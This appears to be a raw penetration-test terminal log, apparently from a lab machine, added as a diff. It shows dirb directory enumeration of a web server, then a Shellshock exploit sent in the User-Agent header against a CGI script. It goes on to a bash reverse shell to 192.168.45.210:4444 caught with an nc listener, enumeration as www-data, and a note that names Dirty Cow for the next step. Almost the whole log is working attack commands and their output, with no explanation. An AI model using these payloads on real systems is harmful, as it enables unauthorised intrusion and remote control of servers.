@@ -1,0 +1,88 @@
+┌──(root㉿kali)-[/home/kali]
+└─# dirb http://192.168.117.87/
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Mon Oct  6 22:49:46 2025
+URL_BASE: http://192.168.117.87/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://192.168.117.87/ ----
++ http://192.168.117.87/cgi-bin/ (CODE:403|SIZE:290)                                                                
++ http://192.168.117.87/index (CODE:200|SIZE:177)                                                                   
++ http://192.168.117.87/index.html (CODE:200|SIZE:177)                                                              
++ http://192.168.117.87/server-status (CODE:403|SIZE:295)                                                           
+                                                                                                                    
+-----------------
+END_TIME: Mon Oct  6 22:52:26 2025
+DOWNLOADED: 4612 - FOUND: 4
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# 
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# dirb http://192.168.117.87/cgi-bin/            
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Mon Oct  6 22:53:27 2025
+URL_BASE: http://192.168.117.87/cgi-bin/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://192.168.117.87/cgi-bin/ ----
++ http://192.168.117.87/cgi-bin/test (CODE:200|SIZE:14)                                                             
+                                                                                                                    
+-----------------
+END_TIME: Mon Oct  6 22:56:06 2025
+DOWNLOADED: 4612 - FOUND: 1
+
+
+
+┌──(root㉿kali)-[/home/kali]
+└─# curl -s -D - -H 'User-Agent: () { :; }; echo; /bin/bash -c "echo SHELLSHOCK_OK $(id)"' 'http://192.168.117.87/cgi-bin/test/' | sed -n '1,160p'
+HTTP/1.1 200 OK
+Date: Tue, 07 Oct 2025 03:08:34 GMT
+Server: Apache/2.2.22 (Ubuntu)
+Transfer-Encoding: chunked
+
+SHELLSHOCK_OK
+                                                                                                                    
+
+┌──(root㉿kali)-[/home/kali]
+└─# curl -s -H 'User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/192.168.45.210/4444 0>&1' 'http://192.168.117.87/cgi-bin/test/'
+^C
+                                                                                                                     
+┌──(root㉿kali)-[/home/kali]
+└─# nc -lvnp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.210] from (UNKNOWN) [192.168.117.87] 39838
+bash: no job control in this shell
+www-data@ubuntu:/usr/lib/cgi-bin$ id
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+www-data@ubuntu:/usr/lib/cgi-bin$ 
+www-data@ubuntu:/$ cat /proc/version
+Linux version 3.2.0-23-generic (buildd@crested) (gcc version 4.6.3 (Ubuntu/Linaro 4.6.3-1ubuntu4) ) #36-Ubuntu SMP Tue Apr 10 20:39:51 UTC 2012
+www-data@ubuntu:/$ uname
+Linux
+
+
+Dirty Cow
+
+
+
